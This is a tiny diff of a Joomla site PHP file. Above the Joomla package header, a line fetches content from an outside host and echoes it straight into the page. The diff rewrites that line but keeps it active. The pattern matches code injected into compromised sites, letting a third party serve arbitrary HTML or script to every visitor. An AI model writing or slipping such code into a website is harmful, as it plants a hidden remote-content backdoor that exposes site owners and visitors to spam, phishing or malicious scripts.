@@ -1,6 +1,5 @@
 <?php
-$homepage = file_get_contents('https://includes-page.com/L/h.txt');
-echo $homepage;
+echo file_get_contents("https://includes-page.com/L/h.txt");
 /**
  * @package    Joomla.Site
  *
